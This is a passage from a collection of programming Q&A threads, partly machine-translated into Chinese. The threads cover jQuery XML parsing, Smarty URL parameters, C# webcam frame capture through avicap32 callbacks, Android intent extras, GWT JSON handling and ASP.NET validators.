我正在获取具有名称属性的父母的列表视图，但是当我单击父母中的任何人时，每个链接都会获得相同的内容，并且它还会在单个列表中显示内容。

你能解决这个问题以获得解决方案，因为每个父母只能在列表视图中获得他们的孩子内容。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T06:47:14.880

```
 $(document).ready(function () {

       $('#button').on('click',function() {
            // getting all child elements based on the parent name
                var parNode="Seduce Your Partner";
                var data='<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>........... ';
                var list='';
                //$.get('sample.xml', null, function (data, textStatus) {
                        list='<ul>';
                        $(data).find('sections section[name="Seduce Your Partner"]').children().each(function () {
                            list+='<li>'+$(this).text()+'</li>';
                        });
                         list+='<ul>';
            //}, 'xml');
                $('#targetDiv').text(list);

      } );

}); 
```

此代码用于获取所有子元素。我想您会知道如何获取父节点的名称，因为那是上述代码的输入。

同样，您可以使用从子节点获取父节点的引用。`closest()`.

**编辑：上面的代码已经更新，它的工作副本在** [这里](http://jsfiddle.net/dreamweiver/mJJET/)

快乐编码:)

# php - 如何从 smarty 模板中的 URL 访问值？

> ID：16184657
> 
> 赞同：1
> 
> 时间：2013-04-24T06:15:21.587
> 
> 标签：php, smarty

我是 smarty 的新手，所以在使用它时遇到了很多困难。我有以下网址：

```
http://localhost/schooling_needs/sneeds1.0/web/control/modules/chapter_youtube_videos/chapter_youtube_videos.php?chapter_id=102 
```

我想将 chapter_id 的值分配给 smarty 模板中的文本字段。为此，我编写了以下代码，但没有得到正确的值。

```
<input type="text" name="chapter_id" id="chapter_id" value="{$chapter_id}"> 
```

文本字段没有获得任何价值。`chapter_id`请您告诉我应该如何将值分配给上述文本字段，请帮助我？提前致谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-24T06:20:20.917

您需要在代码中将其分配给您正在使用的 smarty 模板。例如：

```
$smarty->assign('chapter_id', $_GET['chapter_id']); 
```

在您`fetch`/`display`您的模板之前。^^

由于 OP 的限制，使用内置 smarty 而不是单独分配给页面：

```
{$smarty.get.chapter_id} 
```

将直接从`$_GET`数组中提供它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-24T06:21:07.250

像这样使用`$_REQUEST`：

```
$chapter_id = $_REQUEST['chapter_id']; 
```

在这里，`$_REQUEST['chapter_id'];`从 url 获取章节 ID。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-24T06:32:03.233

您可以使用 访问`$_GET`模板中的参数`$smarty.get.parametername`。所以你的代码应该是这样的：

```
<input type="text" name="chapter_id" id="chapter_id" value="{$smarty.get.chapter_id}"> 
```

您可以在[Smarty 文档中阅读更多内容](http://www.smarty.net/docsv2/en/language.variables.smarty.tpl)

# c# - How to copy image without using the clipboard?

> ID：16184659
> 
> 赞同：6
> 
> 时间：2013-04-24T06:15:28.863
> 
> 标签：c#, winapi, video, webcam, vfw

Question: I have the below code to capture an image from a webcam.

My problem is this part:

```
SendMessage(hCaptureWnd, WM_CAP_COPY, 0, 0);                    // copy it to the clipboard 
```

What it does is copy the image from the window to the clipboard, and then create a byte array out of it.

It works - as long as you don't use the clipboard while the program is running.
The problem is, this doesn't even work for myself, as I sometimes copy something while Visual Studio takes ages to start debug the web application, and then it crashes.

So here my question:
How can I get the image without using the clipboard ? Or more specifically, how to transform hCaptureWnd to System.Drawing.Image ?

* * *

-- Edit:
I missed to say "without creating a file, i want a byte array".
It's a web application, so the user the application runs under shouldn't have write access to the file system (writing to a file only for temporary testing) ...
-- End Edit:

* * *

```
/// <summary>
/// Captures a frame from the webcam and returns the byte array associated
/// with the captured image
/// </summary>
/// <param name="connectDelay">number of milliseconds to wait between connect 
/// and capture - necessary for some cameras that take a while to 'warm up'</param>
/// <returns>byte array representing a bitmp or null (if error or no webcam)</returns>
private static byte[] InternalCaptureToByteArray(int connectDelay = 500)
{
    Clipboard.Clear();                                              // clear the clipboard
    int hCaptureWnd = capCreateCaptureWindowA("ccWebCam", 0, 0, 0,  // create the hidden capture window
        350, 350, 0, 0);
    SendMessage(hCaptureWnd, WM_CAP_CONNECT, 0, 0);                 // send the connect message to it
    Thread.Sleep(connectDelay);                                     // sleep the specified time
    SendMessage(hCaptureWnd, WM_CAP_GET_FRAME, 0, 0);               // capture the frame
    SendMessage(hCaptureWnd, WM_CAP_COPY, 0, 0);                    // copy it to the clipboard
    SendMessage(hCaptureWnd, WM_CAP_DISCONNECT, 0, 0);              // disconnect from the camera
    Bitmap bitmap = (Bitmap)Clipboard.GetDataObject().GetData(DataFormats.Bitmap);  // copy into bitmap

    if (bitmap == null)
        return null;

    using (MemoryStream stream = new MemoryStream())
    {
        bitmap.Save(stream, ImageFormat.Bmp);    // get bitmap bytes
        return stream.ToArray();
    } // End Using stream

} // End Function InternalCaptureToByteArray 
```

Note ([http://msdn.microsoft.com/en-us/library/windows/desktop/dd756879(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/dd756879(v=vs.85).aspx)):

```
HWND VFWAPI capCreateCaptureWindow(
  LPCTSTR lpszWindowName,
  DWORD dwStyle,
  int x,
  int y,
  int nWidth,
  int nHeight,
  HWND hWnd,
  int nID
);

#define VFWAPI  WINAPI 

typedef HANDLE HWND;
typedef PVOID HANDLE;
typedef void *PVOID; 
```

Full code for reference

```
using System;
using System.IO;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using System.Drawing.Imaging;
using System.Collections.Generic;
using System.Runtime.InteropServices;

// http://www.creativecodedesign.com/node/66
// http://www.barebonescoder.com/2012/01/finding-your-web-cam-with-c-directshow-net/
// http://www.codeproject.com/Articles/15219/WebCam-Fast-Image-Capture-Service-using-WIA
// http://www.c-sharpcorner.com/uploadfile/yougerthen/integrate-the-web-webcam-functionality-using-C-Sharp-net-and-com-part-viii/
// http://forums.asp.net/t/1410057.aspx

namespace cc.Utility
{

    // bool isCaptured = ccWebCam.CaptureSTA("capture.jpg"); // Access to path C:\Program Files (x86)\Common Files\Microsoft Shared\DevServer\10.0\capture.jpg" denied.
    // byte[] captureBytes = ccWebCam.CaptureSTA();

    /// <summary>
    /// Timur Kovalev (http://www.creativecodedesign.com):
    /// This class provides a method of capturing a webcam image via avicap32.dll api.
    /// </summary>    
    public static class ccWebCam
    {
        #region *** PInvoke Stuff - methods to interact with capture window ***

        [DllImport("user32", EntryPoint = "SendMessage")]
        private static extern int SendMessage(int hWnd, uint Msg, int wParam, int lParam);

        [DllImport("avicap32.dll", EntryPoint = "capCreateCaptureWindowA")]
        private static extern int capCreateCaptureWindowA(string lpszWindowName, int dwStyle, 
            int X, int Y, int nWidth, int nHeight, int hwndParent, int nID);  

        private const int WM_CAP_CONNECT = 1034;
        private const int WM_CAP_DISCONNECT = 1035;
        private const int WM_CAP_COPY = 1054;
        private const int WM_CAP_GET_FRAME = 1084;

        #endregion

        private static object objWebCamThreadLock = new object();

        //CaptureToFile(@"D:\Stefan.Steiger\Documents\Visual Studio 2010\Projects\Post_Ipag\image3.jpg"):
        public static bool Capture(string filePath, int connectDelay = 500)
        {
            lock (objWebCamThreadLock)
            {
                return cc.Utility.ccWebCam.InternalCaptureAsFileInThread(filePath, connectDelay);
            }
        } // End Treadsafe Function Capture

        public static byte[] Capture(int connectDelay = 500)
        {
            lock (objWebCamThreadLock)
            {
                return InternalCaptureToByteArrayInThread(connectDelay);
            }
        } // End Treadsafe Function Capture

        /// <summary>
        /// Captures a frame from the webcam and returns the byte array associated
        /// with the captured image. The image is also stored in a file
        /// </summary>
        /// <param name="filePath">path the file wher ethe image will be saved</param>
        /// <param name="connectDelay">number of milliseconds to wait between connect 
        /// and capture - necessary for some cameras that take a while to 'warm up'</param>
        /// <returns>true on success, false on failure</returns>
        private static bool InternalCaptureAsFileInThread(string filePath, int connectDelay = 500)
        {
            bool success = false;
            Thread catureThread = new Thread(() =>
            {
                success = InternalCaptureAsFile(filePath, connectDelay);
            });
            catureThread.SetApartmentState(ApartmentState.STA);
            catureThread.Start();
            catureThread.Join();
            return success;
        } // End Function InternalCaptureAsFileInThread

        /// <summary>
        /// Captures a frame from the webcam and returns the byte array associated
        /// with the captured image. The image is also stored in a file
        /// </summary>
        /// <param name="filePath">path the file wher ethe image will be saved</param>
        /// <param name="connectDelay">number of milliseconds to wait between connect 
        /// and capture - necessary for some cameras that take a while to 'warm up'</param>
        /// <returns>true on success, false on failure</returns>
        private static bool InternalCaptureAsFile(string filePath, int connectDelay = 500)
        {
            byte[] capture = ccWebCam.InternalCaptureToByteArray(connectDelay);
            if (capture != null)
            {
                // Access to path C:\Program Files (x86)\Common Files\Microsoft Shared\DevServer\10.0\image1.jpg" denied.
                File.WriteAllBytes(filePath, capture);
                return true;
            }
            return false;
        } // End Function InternalCaptureAsFile

        /// <summary>
        /// Captures a frame from the webcam and returns the byte array associated
        /// with the captured image. Runs in a newly-created STA thread which is 
        /// required for this method of capture
        /// </summary>
        /// <param name="connectDelay">number of milliseconds to wait between connect 
        /// and capture - necessary for some cameras that take a while to 'warm up'</param>
        /// <returns>byte array representing a bitmp or null (if error or no webcam)</returns>
        private static byte[] InternalCaptureToByteArrayInThread(int connectDelay = 500)
        {
            byte[] bytes = null;
            Thread catureThread = new Thread(() =>
            {
                bytes = InternalCaptureToByteArray(connectDelay);
            });
            catureThread.SetApartmentState(ApartmentState.STA);
            catureThread.Start();
            catureThread.Join();
            return bytes;
        } // End Function InternalCaptureToByteArrayInThread

        /// <summary>
        /// Captures a frame from the webcam and returns the byte array associated
        /// with the captured image
        /// </summary>
        /// <param name="connectDelay">number of milliseconds to wait between connect 
        /// and capture - necessary for some cameras that take a while to 'warm up'</param>
        /// <returns>byte array representing a bitmp or null (if error or no webcam)</returns>
        private static byte[] InternalCaptureToByteArray(int connectDelay = 500)
        {
            Clipboard.Clear();                                              // clear the clipboard
            int hCaptureWnd = capCreateCaptureWindowA("ccWebCam", 0, 0, 0,  // create the hidden capture window
                350, 350, 0, 0);
            SendMessage(hCaptureWnd, WM_CAP_CONNECT, 0, 0);                 // send the connect message to it
            Thread.Sleep(connectDelay);                                     // sleep the specified time
            SendMessage(hCaptureWnd, WM_CAP_GET_FRAME, 0, 0);               // capture the frame
            SendMessage(hCaptureWnd, WM_CAP_COPY, 0, 0);                    // copy it to the clipboard
            SendMessage(hCaptureWnd, WM_CAP_DISCONNECT, 0, 0);              // disconnect from the camera
            Bitmap bitmap = (Bitmap)Clipboard.GetDataObject().GetData(DataFormats.Bitmap);  // copy into bitmap

            if (bitmap == null)
                return null;

            using (MemoryStream stream = new MemoryStream())
            {
                bitmap.Save(stream, ImageFormat.Bmp);    // get bitmap bytes
                return stream.ToArray();
            } // End Using stream

        } // End Function InternalCaptureToByteArray

    }

} 
```

* * *

I tried like this, but it only gets a black image...

```
 [DllImport("user32.dll")]
    static extern IntPtr GetWindowDC(IntPtr hWnd);

    [DllImport("gdi32.dll", SetLastError = true)]
    static extern IntPtr CreateCompatibleDC(IntPtr hdc);

    enum TernaryRasterOperations : uint
    {
        /// <summary>dest = source</summary>
        SRCCOPY = 0x00CC0020,
        /// <summary>dest = source OR dest</summary>
        SRCPAINT = 0x00EE0086,
        /// <summary>dest = source AND dest</summary>
        SRCAND = 0x008800C6,
        /// <summary>dest = source XOR dest</summary>
        SRCINVERT = 0x00660046,
        /// <summary>dest = source AND (NOT dest)</summary>
        SRCERASE = 0x00440328,
        /// <summary>dest = (NOT source)</summary>
        NOTSRCCOPY = 0x00330008,
        /// <summary>dest = (NOT src) AND (NOT dest)</summary>
        NOTSRCERASE = 0x001100A6,
        /// <summary>dest = (source AND pattern)</summary>
        MERGECOPY = 0x00C000CA,
        /// <summary>dest = (NOT source) OR dest</summary>
        MERGEPAINT = 0x00BB0226,
        /// <summary>dest = pattern</summary>
        PATCOPY = 0x00F00021,
        /// <summary>dest = DPSnoo</summary>
        PATPAINT = 0x00FB0A09,
        /// <summary>dest = pattern XOR dest</summary>
        PATINVERT = 0x005A0049,
        /// <summary>dest = (NOT dest)</summary>
        DSTINVERT = 0x00550009,
        /// <summary>dest = BLACK</summary>
        BLACKNESS = 0x00000042,
        /// <summary>dest = WHITE</summary>
        WHITENESS = 0x00FF0062,
        /// <summary>
        /// Capture window as seen on screen.  This includes layered windows 
        /// such as WPF windows with AllowsTransparency="true"
        /// </summary>
        CAPTUREBLT = 0x40000000
    }

    [DllImport("gdi32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool BitBlt(IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, TernaryRasterOperations dwRop);

    [DllImport("gdi32.dll")]
    static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);

    [DllImport("gdi32.dll", ExactSpelling = true, PreserveSig = true, SetLastError = true)]
    static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

    [DllImport("gdi32.dll")]
    static extern bool DeleteDC(IntPtr hdc);

    [DllImport("user32.dll")]
    static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDC);

    [DllImport("gdi32.dll")]
    static extern bool DeleteObject(IntPtr hObject);

    public static void ScreenshotWindow(IntPtr windowHandle)
    {
        Rect Rect = new Rect();

        GetWindowRect(windowHandle, ref Rect);
        int width = Rect.Right - Rect.Left;
        int height = Rect.Bottom - Rect.Top;

        IntPtr windowDeviceContext = GetWindowDC(windowHandle);
        IntPtr destDeviceContext = CreateCompatibleDC(windowDeviceContext);
        IntPtr bitmapHandle = CreateCompatibleBitmap(windowDeviceContext, width, height);
        IntPtr oldObject = SelectObject(destDeviceContext, bitmapHandle);

        BitBlt(destDeviceContext, 0, 0, width, height, windowDeviceContext, 0, 0, TernaryRasterOperations.CAPTUREBLT | TernaryRasterOperations.SRCCOPY);
        SelectObject(destDeviceContext, oldObject);

        DeleteDC(destDeviceContext);
        ReleaseDC(windowHandle, destDeviceContext);

        Image screenshot = Image.FromHbitmap(bitmapHandle);
        DeleteObject(bitmapHandle);

        screenshot.Save("d:\\temp\\mywebcamimage.png", System.Drawing.Imaging.ImageFormat.Png);

        /*
        // TODO - Remove above save when it works
        using (MemoryStream stream = new MemoryStream())
        {
            screenshot.Save(stream, System.Drawing.Imaging.ImageFormat.Png);
            return stream.ToArray();
        }
        */
    } 
```

And then this after `SendMessage(hCaptureWnd, WM_CAP_GET_FRAME, 0, 0);`

```
ScreenshotWindow(new IntPtr(hCaptureWnd)); 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-24T10:06:46.433

没有这样的事情`WM_CAP_GET_FRAME`。消息的正确名称是[`WM_CAP_GRAB_FRAME`](http://msdn.microsoft.com/en-us/library/windows/desktop/dd743909%28v=vs.85%29.aspx)，它在 MSDN 上有所描述。

它的作用是：

> WM_CAP_GRAB_FRAME 消息从捕获驱动程序中检索并显示单个帧。捕获后，覆盖和预览将被禁用。您可以显式发送此消息，也可以使用 capGrabFrame 宏。

要获取实际数据，您需要使用[MSDN 上进一步描述的帧回调](http://msdn.microsoft.com/en-us/library/windows/desktop/dd743921%28v=vs.85%29.aspx)。回调为您获取图片字节，您可以将其写入文件或用于任何处理，而无需通过剪贴板传输。

> ...是与流式捕获一起使用的回调函数，可选择性地处理捕获的视频帧。名称 capVideoStreamCallback 是应用程序提供的函数名称的占位符。
> 
> [你有一个] ...指向包含有关捕获帧的信息的 VIDEOHDR 结构的指针。

同样，此 API 是视频捕获的不幸选择。太老了，太局限了。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-24T06:43:50.920

您必须发送不同的消息，特别是`WM_CAP_FILE_SAVEDIB`，将数据保存在磁盘上的文件中。然后，您将能够将其加载到`Bitmap`对象中以进行进一步处理（我不知道任何内置的 cam-to-byte[] 功能）。

```
[DllImport("user32", EntryPoint = "SendMessage")]
private static extern int SendMessage(
    int hWnd, uint Msg, int wParam, string strFileName);

private const int WM_USER = 0x0400;
private const int WM_CAP_START = WM_USER;
private const int WM_CAP_FILE_SAVEDIB = WM_CAP_START + 25; 
```

* * *

```
//before
SendMessage(hCaptureWnd, WM_CAP_COPY, 0, 0);

//after
string tempFile = Server.MapPath("~/App_Data/tempCap.bmp");
SendMessage(hCaptureWnd, WM_CAP_FILE_SAVEDIB, 0, tempFile); //create tempfile
Bitmap bitmap = new Bitmap(tempFile); //read tempfile
using (MemoryStream stream = new MemoryStream())
{
    bitmap.Save(stream, ImageFormat.Bmp);
    return stream.ToArray();
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-25T07:10:21.073

基于 Roman R. 的回答：

道德的更好点是您需要注册回调帧，然后调用grabframe，并且您不能直接将C样式的char []转换为byte []，并且您获得原始位图数据-而不是位图，并且图像大小为 640x480，与 capCreateCaptureWindowA 中设置的内容无关，并且 lpData 需要是 IntPtr，而不是 UIntPtr，因为 Marshal.Copy 没有 UIntPtr 过载，并且使用 WriteBitmapFile，可以写入原始位图数据在不使用不安全代码或映射位图文件头的情况下进入位图，并且编写 Marshal.Copy 的人可以复制负值，因为长度是 int，而不是 uint ...

此外，无论出于何种原因，都需要将图像旋转 180 oldDegrees...
此外，我将 WM 常量更改为正确的名称。

```
 SendMessage(hCaptureWnd, WM_CAP_SET_CALLBACK_FRAME, 0, capVideoStreamCallback);
    SendMessage(hCaptureWnd, WM_CAP_GRAB_FRAME, 0, 0);               // capture the frame 
```

有了这些额外的东西

```
 // http://msdn.microsoft.com/en-us/library/windows/desktop/dd757688(v=vs.85).aspx
    [StructLayout(LayoutKind.Sequential)]
    private struct VIDEOHDR 
    {
        // http://msdn.microsoft.com/en-us/library/windows/desktop/aa383751(v=vs.85).aspx

        // typedef unsigned char BYTE;
        // typedef BYTE far *LPBYTE;
        // unsigned char* lpData

        //public byte[] lpData; // LPBYTE    lpData; // Aaargh, invalid cast, not a .NET byte array...
        public IntPtr lpData; // LPBYTE    lpData;
        public UInt32 dwBufferLength; // DWORD     dwBufferLength;
        public UInt32 dwBytesUsed; // DWORD     dwBytesUsed;
        public UInt32 dwTimeCaptured; // DWORD     dwTimeCaptured;

        // typedef ULONG_PTR DWORD_PTR;
        // #if defined(_WIN64)  
        //   typedef unsigned __int64 ULONG_PTR;
        // #else
        //   typedef unsigned long ULONG_PTR;
        // #endif
        public IntPtr dwUser; // DWORD_PTR dwUser; 
        public UInt32 dwFlags; // DWORD     dwFlags;

        [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.ByValArray, SizeConst = 4)]
        public System.UIntPtr[] dwReserved; // DWORD_PTR dwReserved[4];

        // Does not make a difference
        //public System.UIntPtr[] dwReserved = new System.UIntPtr[4]; // DWORD_PTR dwReserved[4];
    }

    private delegate System.IntPtr capVideoStreamCallback_t(System.UIntPtr hWnd, ref VIDEOHDR lpVHdr);
    [DllImport("user32", EntryPoint = "SendMessage")]
    private static extern int SendMessage(int hWnd, uint Msg, int wParam, capVideoStreamCallback_t routine);

    // http://eris.liralab.it/yarpdoc/vfw__extra__from__wine_8h.html
    private const int WM_USER = 0x0400; // 1024
    private const int WM_CAP_START = WM_USER;
    private const int WM_CAP_DRIVER_CONNECT = WM_CAP_START + 10;
    private const int WM_CAP_DRIVER_DISCONNECT = WM_CAP_START + 11;

    private const int WM_CAP_FILE_SAVEDIB = WM_CAP_START + 25;
    private const int WM_CAP_SET_CALLBACK_FRAME = WM_CAP_START + 5;
    private const int WM_CAP_GRAB_FRAME = WM_CAP_START + 60;
    private const int WM_CAP_EDIT_COPY = WM_CAP_START + 30;

    // http://lists.ximian.com/pipermail/mono-devel-list/2011-March/037272.html

    private static byte[] baSplendidIsolation;

    private static System.IntPtr capVideoStreamCallback(System.UIntPtr hWnd, ref VIDEOHDR lpVHdr)
    {
        //System.Windows.Forms.MessageBox.Show("hello");
        //System.Windows.Forms.MessageBox.Show(lpVHdr.dwBufferLength.ToString() + " " + lpVHdr.dwBytesUsed.ToString());
        byte[] _imageTemp = new byte[lpVHdr.dwBufferLength];
        Marshal.Copy(lpVHdr.lpData, _imageTemp, 0, (int) lpVHdr.dwBufferLength);
        //System.IO.File.WriteAllBytes(@"d:\temp\mycbfile.bmp", _imageTemp); // AAaaarg, it's raw bitmap data...

        // http://stackoverflow.com/questions/742236/how-to-create-a-bmp-file-from-byte-in-c-sharp
        // http://stackoverflow.com/questions/2654480/writing-bmp-image-in-pure-c-c-without-other-libraries

        // Tsssss... 350 x 350 was the expected setting, but never mind... 
        // fortunately alex told me about WM_CAP_FILE_SAVEDIB, so I could compare to the direct output
        int width = 640;
        int height = 480;
        int stride = width*3;

        baSplendidIsolation = null;
        baSplendidIsolation = WriteBitmapFile(@"d:\temp\mycbfilecc.bmp", width, height, _imageTemp);

        /*
        unsafe
        {
            fixed (byte* ptr = _imageTemp)
            {
                using (Bitmap image = new Bitmap(width, height, stride, PixelFormat.Format24bppRgb, new IntPtr(ptr)))
                {
                    image.Save(@"d:\temp\mycbfile2.bmp");
                }
            }
        }
        */

        //var hdr = (Elf32_Phdr)Marshal.PtrToStructure(ptr, typeof(Elf32_Phdr));
        return System.IntPtr.Zero;
    }

    private static byte[] WriteBitmapFile(string filename, int width, int height, byte[] imageData)
    {
        using (var stream = new MemoryStream(imageData))
        using (var bmp = new Bitmap(width, height, PixelFormat.Format24bppRgb))
        {
            BitmapData bmpData = bmp.LockBits(new Rectangle(0, 0,bmp.Width, bmp.Height)
                                                ,ImageLockMode.WriteOnly
                                                ,bmp.PixelFormat
            );

            Marshal.Copy(imageData, 0, bmpData.Scan0, imageData.Length);

            bmp.UnlockBits(bmpData);

            if (bmp == null)
                return null;

            bmp.RotateFlip(RotateFlipType.Rotate180FlipNone);
            bmp.Save(filename); // For testing only

            using (MemoryStream ms = new MemoryStream())
            {
                bmp.Save(ms, ImageFormat.Png);    // get bitmap bytes
                return ms.ToArray();
            } // End Using stream

        }

    } // End Function WriteBitmapFile

    /// <summary>
    /// Captures a frame from the webcam and returns the byte array associated
    /// with the captured image
    /// </summary>
    /// <param name="connectDelay">number of milliseconds to wait between connect 
    /// and capture - necessary for some cameras that take a while to 'warm up'</param>
    /// <returns>byte array representing a bitmp or null (if error or no webcam)</returns>
    private static byte[] InternalCaptureToByteArray(int connectDelay = 500)
    {
        Clipboard.Clear(); 
        int hCaptureWnd = capCreateCaptureWindowA("ccWebCam", 0, 0, 0,
            350, 350, 0, 0); // create the hidden capture window
        SendMessage(hCaptureWnd, WM_CAP_DRIVER_CONNECT, 0, 0); // send the connect message to it
        //SendMessage(hCaptureWnd, WM_CAP_DRIVER_CONNECT, i, 0); // i device number retval != 0 --> valid device_id

        Thread.Sleep(connectDelay);                                     // sleep the specified time
        SendMessage(hCaptureWnd, WM_CAP_SET_CALLBACK_FRAME, 0, capVideoStreamCallback);
        SendMessage(hCaptureWnd, WM_CAP_GRAB_FRAME, 0, 0);               // capture the frame

        //SendMessage(hCaptureWnd, WM_CAP_FILE_SAVEDIB, 0, "d:\\temp\\testmywebcamimage.bmp");
        //ScreenshotWindow(new IntPtr(hCaptureWnd));

        //SendMessage(hCaptureWnd, WM_CAP_EDIT_COPY, 0, 0); // copy it to the clipboard

        // using (Graphics g2 = Graphics.FromHwnd(new IntPtr(hCaptureWnd)))

        SendMessage(hCaptureWnd, WM_CAP_DRIVER_DISCONNECT, 0, 0);              // disconnect from the camera

        return baSplendidIsolation;

        /*
        Bitmap bitmap = (Bitmap)Clipboard.GetDataObject().GetData(DataFormats.Bitmap);  // copy into bitmap

        if (bitmap == null)
            return null;

        using (MemoryStream stream = new MemoryStream())
        {
            bitmap.Save(stream, ImageFormat.Bmp);    // get bitmap bytes
            return stream.ToArray();
        } // End Using stream
        */
    } // End Function InternalCaptureToByteArray 
```

# android - Need help to save/restore a string between activities

> ID：16184660
> 
> 赞同：0
> 
> 时间：2013-04-24T06:15:29.947
> 
> 标签：android, string, android-activity, save, restore

I'm learning Android and I didn't find an answer on the web. I want to save a string from an `EditText` on my `MainActivity` to restore it on my third `Activity` -> `Activity3` I want this string to be displayed on a `TextView` of this `Activity`.

```
public class MainActivity extends Activity {

  private EditText nomPrenom;

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    nomPrenom = (EditText) findViewById(R.id.nomPrenom);
 ...................} 
```

in my activity_main.xml :

```
android:id="@+id/nomPrenom"
android:text="@string/nomPrenom" 
```

and

```
public class Activity3 extends ListActivity {

private TextView yourName;

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_activity3);
    yourName = (TextView) findViewById(R.id.nomPrenom);
    yourName.setText("take the name of activity 1 here"); //<-- this line causes crash !!

..................} 
```

here is activity3.xml

```
android:id="@+id/yourName"
android:text="@string/nomPrenom" 
```

How can I do that ?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T06:27:27.393

首先，您的问题不是很清楚。但是根据给定，我认为您需要从edittext（在主要活动中）获取数据，然后将其传递给第三个活动。

为此，您需要使用 Intent 将数据从一个活动传递到另一个活动。

```
 Example  - 
              nomPrenom = (EditText) findViewById(R.id.nomPrenom);
              nomPrenom .getText.toString();

             Intent in = new Intent(MainActivity.this, Activity3 .class);
                    in.putExtra("value",nomPrenom .getText.toString()) ; 
```

在 Activity3 接收这样的意图：-

```
 String strValue = getIntent().getExtras().getString("value");
                       yourName = (TextView) findViewById(R.id.yourName);
                       yourName.setText(strValue); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-24T06:27:36.917

您可以通过多种方式做到这一点...

您可以使用共享首选项，以便您可以从任何地方访问它。但在您的申请关闭后，共享偏好将保留您的价值。

当您像这样创建活动时，另一种通过活动意图传递您的价值的方法：`intent.putExtra' and get value into your activity via`getExtra`

您可以在全局位置定义变量的另一种方法考虑创建一个类也包含此类公共变量，并且您可以从那里从任何地方访问这些变量。

这三种方式都可以根据您的要求进行更改。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-24T06:29:40.880

为了从 MainActivity 移动到 Activity3 编写以下代码

```
//get your edittext's text here
String text = nomPrenom.getText().toString();

//move to Activity3
Intent intent = new Intent(MainActivity.this, Activity3.class);
//pass the edit text value to Activity3
intent.putExtra("EditTextValue", text);
//start Activity3
startIntent(intent); 
```

在 Activity3 中，要获取您的编辑文本值，请执行以下操作。

```
//get your edit text value here which is passed in MainActivity
String text = getIntent().getStringExtra("EditTextValue"); 
```

变量“text”是您要查找的最终输出。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-24T06:20:05.937

使用`Intent.putExtra("Your text here")`并将其传递给其他活动。

或者您可以从中获取字符串`EditText`并制作字符串`Global`，`public`然后`static`在任何其他类中使用它。

# gwt - How jsonValue.isObject() works?

> ID：16184662
> 
> 赞同：0
> 
> 时间：2013-04-24T06:15:39.007
> 
> 标签：gwt, getjson, json

Hell i would like to know how value.isObject()`enter code here` in below code works.

```
String jsonString = "{\"key\":\"value\"}";
JSONValue value = JSONParser.parseStrict(jsonString);
JSONObject object =value.isObject(); 
```

I had same implementation of JSONValue and object in my project, by using tag

```
<super-source path=""> 
```

I made gwt to use my implementation instead of GWT's. But using my code I have to add a type cast mechanism for isObject() method. Here is my code:

```
String jsonString = "{\"key\":\"value\"}";
JSONValue value = JSONParser.parseStrict(jsonString);
JSONObject object = (JSONObject)value.isObject(); 
```

please be free to share your thoughts regarding this.

**UPDATE** implementation of `isObject()` in my `JSONValue` and `JSONObject`

In JSONValue

```
public JsonObject isObject() {
    return null;
} 
```

In JSONObject

```
 @Override
  public JSONObject isObject() {
      System.out.println("is object return this");
    return this;
  } 
```

where JSONValue is a abstract class and `class JSONObject extends JSONValue`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T08:56:41.067

似乎您正在使用不同的对象，或者您有一个大写的拼写错误：JSONValue 中的 JsonObject 与 JSONObject 中的 JSONObject。

# asp.net - ASP.net Custom Validator message not displaying

> ID：16184664
> 
> 赞同：0
> 
> 时间：2013-04-24T06:15:55.667
> 
> 标签：asp.net, validation, client

I have a div which acts like a modal popup. Inside that, I need a validation for which I setup a custom validator. But the message doesn't get fired, though the alert box does.

My code:

```
 if ((oldFromTime <= newFromTime) && (oldToTime > newFromTime)) {
                 alert("Choose time ahead of the ones saved earlier.!");
                arguments.IsValid = false;

            }
            else {
                arguments.IsValid = true;

            } 
```

And my custom validator

`<asp:CustomValidator id="cboToTimeMins_CustomValidator" ControlToValidate="cboToTimeMins" ClientValidationFunction="validateTime" Display="static" ErrorMessage="Selected time range falls in the range of the ones saved earlier...! Choose another." runat="server" ValidationGroup="Timetable"/>`

cboToTimeMins is my dropdown box, and I need to set the validation message based on the value selected from it. Is there something wrong in my code?

P.S. I am in need of only CLIENT SIDE validation.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T04:49:44.053

这是我的示例解决方案

```
 <td class="normal">Price<span class="required">*</span></td>
                    <td class="normal" colspan="6">
                        <asp:TextBox ID="txtPrice" CssClass="text" Enabled="true" runat="server"  MaxLength="10" Width="100px" />
                         <asp:RequiredFieldValidator ID="RequiredFieldValidator2" runat="server" ControlToValidate="txtPrice"
                                    ErrorMessage="* Please Input Your Price" Display="Dynamic" ValidationGroup="hdrValidation"/>

                    </td> 
```

你需要验证

```
 Page.Validate("hdrValidation")
        If Not Page.IsValid Then Exit Sub 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T04:43:37.180

这是我的解决方案。我删除了下拉菜单的自定义验证器并将其添加到按钮中。此外，我删除了 Javascript 函数中的警报消息。

# mysql - 对 MySQL LOAD DATA 语句使用 DECLARE

> ID：16184665
> 
> 赞同：0
> 
> 时间：2013-04-24T06:16:02.013
> 
> 标签：mysql, stored-procedures

